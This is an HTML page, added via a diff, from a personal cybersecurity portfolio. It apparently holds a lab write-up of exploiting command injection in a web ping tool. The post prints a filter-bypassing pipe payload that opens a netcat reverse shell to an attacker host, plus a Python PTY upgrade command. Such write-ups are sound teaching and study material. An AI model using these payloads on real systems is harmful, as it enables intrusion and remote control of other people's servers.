@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/cyber-portfolio/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=cyber-portfolio/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Web-to-System Pivot via Command Injection | SOPHY&#39;S CYBERLAB</title>
+<meta name="keywords" content="">
+<meta name="description" content="Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
+<link crossorigin="anonymous" href="/cyber-portfolio/assets/css/stylesheet.6bbcea201939e71843d38e53776460ffae2971bacdbd46d7fa318f06b201a929.css" integrity="sha256-a7zqIBk55xhD045Td2Rg/64pcbrNvUbX&#43;jGPBrIBqSk=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/cyber-portfolio/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/cyber-portfolio/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/cyber-portfolio/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/cyber-portfolio/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/cyber-portfolio/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet">
+<style>
+#lightbox {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(19, 19, 24, 0.95);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    cursor: zoom-out;
+}
+#lightbox img {
+    max-width: 90vw;
+    max-height: 90vh;
+    box-shadow: 0 0 50px rgba(131, 220, 93, 0.1);
+    border-radius: 8px;
+    object-fit: contain;
+}
+</style>
+
+<div id="lightbox">
+    <img id="lightbox-img" src="" alt="Popup image">
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const images = document.querySelectorAll(".post-content img, .terminal-img-container img");
+    const lightbox = document.getElementById("lightbox");
+    const lightboxImg = document.getElementById("lightbox-img");
+
+    images.forEach(img => {
+        img.addEventListener("click", function() {
+            lightboxImg.src = this.src;
+            lightbox.style.display = "flex";
+        });
+    });
+
+    lightbox.addEventListener("click", function() {
+        lightbox.style.display = "none";
+        lightboxImg.src = "";
+    });
+});
+</script>
+<script defer src="/cyber-portfolio/js/fuse.basic.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    let searchInput = document.getElementById("inline-search-input");
+    let searchResults = document.getElementById("inline-search-results");
+    let fuse;
+    
+    if(!searchInput) return;
+
+    fetch("\/cyber-portfolio\/index.json")
+        .then(res => res.json())
+        .then(data => {
+            let options = {
+                keys: ["title", "content", "summary", "tags"],
+                ignoreLocation: true,
+                threshold: 0.3,
+                minMatchCharLength: 2
+            };
+            fuse = new Fuse(data, options);
+        })
+        .catch(err => console.error("Search index failed to load", err));
+
+    searchInput.addEventListener("input", function() {
+        if (!fuse) return;
+        let query = this.value;
+        if (query.trim().length === 0) {
+            searchResults.style.display = "none";
+            searchResults.innerHTML = "";
+            return;
+        }
+        
+        let results = fuse.search(query);
+        if (results.length > 0) {
+            let html = "";
+            results.slice(0, 8).forEach(res => {
+                html += `<li><a href="${res.item.permalink}">${res.item.title}</a></li>`;
+            });
+            searchResults.innerHTML = html;
+            searchResults.style.display = "block";
+        } else {
+            searchResults.innerHTML = "<li class='no-results'>No results found</li>";
+            searchResults.style.display = "block";
+        }
+    });
+
+    document.addEventListener("click", function(event) {
+        if (!searchInput) return;
+        if (!searchInput.contains(event.target) && !searchResults.contains(event.target)) {
+            searchResults.style.display = "none";
+        }
+    });
+});
+</script>
+
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/cyber-portfolio/" accesskey="h" title="SOPHY'S CYBERLAB (Alt + H)">
+                <span class="material-symbols-outlined" style="color: var(--primary); font-size: 28px;">terminal</span>
+                <span style="font-family: 'Space Grotesk', sans-serif; font-weight: 700; letter-spacing: -0.05em;">SOPHY'S CYBERLAB</span>
+            </a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/cyber-portfolio/about/" title="About Me">
+                    <span>About Me</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/cyber-portfolio/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+
+    <main class="main">
+
+<article class="post-single main-editorial-grid">
+  <header class="post-header-editorial">
+    <div class="breadcrumbs"><a href="http://localhost:1313/cyber-portfolio/">Home</a>
+            <span>/</span><a href="http://localhost:1313/cyber-portfolio/posts/">Posts</a>
+</div>
+    
+    <div class="editorial-top-section">
+      <div class="editorial-title-container">
+        <h1 class="post-title-editorial">
+          Web-to-System Pivot via Command Injection
+        </h1>
+      </div>
+
+      <div class="editorial-side-metadata">
+      </div>
+    </div>
+  </header> 
+<div class="terminal-window terminal-glow mb-8">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <span style="margin-left: 10px; font-family: 'JetBrains Mono', monospace; font-size: 10px; opacity: 0.5; text-transform: uppercase; letter-spacing: 0.1em;">Project_Detail
+        </span>
+    </div>
+    <div class="terminal-img-container">
+        <figure class="entry-cover" style="margin: 0;">
+                <img loading="eager" src="http://localhost:1313/cyber-portfolio/images/project6_reverse_shell.png" alt=""></figure>
+    </div>
+</div>
+    
+
+  <div class="post-content-container">
+
+    <div class="post-content"><p><strong>Objective:</strong> To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.</p>
+<h2 id="1-the-vulnerability-improper-input-validation">1. The Vulnerability: Improper Input Validation<a hidden class="anchor" aria-hidden="true" href="#1-the-vulnerability-improper-input-validation">#</a></h2>
+<p>The target was a web-based &ldquo;Network Diagnostic Tool&rdquo; designed to ping IP addresses. By analyzing the application’s behavior, I identified that it was passing user-supplied input directly to the system shell without proper sanitization. This allowed for Command Chaining, where a legitimate command is followed by a malicious one.</p>
+<h2 id="2-technical-execution-bypassing-filters">2. Technical Execution: Bypassing Filters<a hidden class="anchor" aria-hidden="true" href="#2-technical-execution-bypassing-filters">#</a></h2>
+<p>Initial attempts to use the semicolon (<code>;</code>) separator were blocked by the application&rsquo;s basic &ldquo;Sanity Check.&rdquo; I successfully bypassed this restriction by using the Pipe (<code>|</code>) operator, which redirected the command flow to the system&rsquo;s <code>sh</code> (shell) environment.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Component</th>
+          <th style="text-align: left">Value</th>
+          <th style="text-align: left">Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>Exploit Vector</strong></td>
+          <td style="text-align: left">Web Input Field (Ping)</td>
+          <td style="text-align: left">The entry point for the attack.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Payload</strong></td>
+          <td style="text-align: left"><code>`127.0.0.1 | nc [Attacker_IP] [Port] -e /bin/sh`</code></td>
+          <td style="text-align: left">Execution of the attack string.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Listener</strong></td>
+          <td style="text-align: left">Netcat (<code>nc -lvp</code>)</td>
+          <td style="text-align: left">The &ldquo;Ear&rdquo; on Kali waiting for the connection.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Target User</strong></td>
+          <td style="text-align: left"><code>www-data</code></td>
+          <td style="text-align: left">The service account running the web server.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="3-execution-workflow">3. Execution Workflow<a hidden class="anchor" aria-hidden="true" href="#3-execution-workflow">#</a></h2>
+<ol>
+<li><strong>Listener Initialization:</strong> I opened a listening port on my Kali machine using Netcat to intercept the incoming connection.</li>
+<li><strong>Payload Injection:</strong> I entered the malicious string into the web form. This told the server: &ldquo;Ping yourself, but then open a connection to Sophy&rsquo;s Kali machine and give her a terminal.&rdquo;</li>
+<li><strong>Connection Capture:</strong> The server executed the command, and a Reverse Shell was established.</li>
+<li><strong>Shell Stabilization:</strong> To convert the &ldquo;dumb&rdquo; shell into a functional terminal, I utilized a Python PTY spawn trick to gain an interactive Bash prompt.</li>
+</ol>
+<h2 id="4-key-commands-used">4. Key Commands Used<a hidden class="anchor" aria-hidden="true" href="#4-key-commands-used">#</a></h2>
+<ul>
+<li><strong>On Kali:</strong> <code>nc -lvp 4444</code> (To wait for the server&rsquo;s call).</li>
+<li><strong>In Web Box:</strong> <code>127.0.0.1 | nc 192.168.56.1 4444 -e /bin/sh</code> (The &ldquo;Phone Home&rdquo; command).</li>
+<li><strong>In Reverse Shell:</strong> <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> (To stabilize the terminal).</li>
+</ul>
+<p><div class="terminal-window" style="margin: 40px 0;">
+    <div class="terminal-header">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span class="terminal-label" style="font-family: 'JetBrains Mono', monospace; font-size: 10px; opacity: 0.5; margin-left: 10px;">RESOURCES_NODE_01</span>
+    </div>
+    <div class="terminal-img-container"><img src="http://localhost:1313/cyber-portfolio/images/project6_web_injection.png" 
+             alt="Screenshot" 
+              
+             loading="lazy">
+    </div>
+</div>
+
+<em>Caption: Demonstrating the successful bypass of input validation to execute system commands through a web interface.</em></p>
+<p><div class="terminal-window" style="margin: 40px 0;">
+    <div class="terminal-header">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span class="terminal-label" style="font-family: 'JetBrains Mono', monospace; font-size: 10px; opacity: 0.5; margin-left: 10px;">RESOURCES_NODE_01</span>
+    </div>
+    <div class="terminal-img-container"><img src="http://localhost:1313/cyber-portfolio/images/project6_reverse_shell.png" 
+             alt="Screenshot" 
+              
+             loading="lazy">
+    </div>
+</div>
+
+<em>Caption: Establishing a persistent Reverse Shell and upgrading to a fully interactive TTY session.</em></p>
+<h2 id="5-professional-impact">5. Professional Impact<a hidden class="anchor" aria-hidden="true" href="#5-professional-impact">#</a></h2>
+<p>This project demonstrates Lateral Movement. It shows that even if a server is patched at the OS level, a single vulnerable web form can provide a gateway to the internal network. By upgrading the shell using Python, I proved my ability to maintain a stable &ldquo;Command and Control&rdquo; (C2) presence on a target, which is essential for deep-penetration testing.</p>
+
+    </div>
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/cyber-portfolio/posts/database-breach-vulnerability/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Database Breach &amp; Administrative Data Exfiltration</span>
+  </a>
+  <a class="next" href="http://localhost:1313/cyber-portfolio/posts/cryptanalysis-hash-cracking/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Offline Cryptanalysis &amp; Password Recovery</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/cyber-portfolio/">SOPHY&#39;S CYBERLAB</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
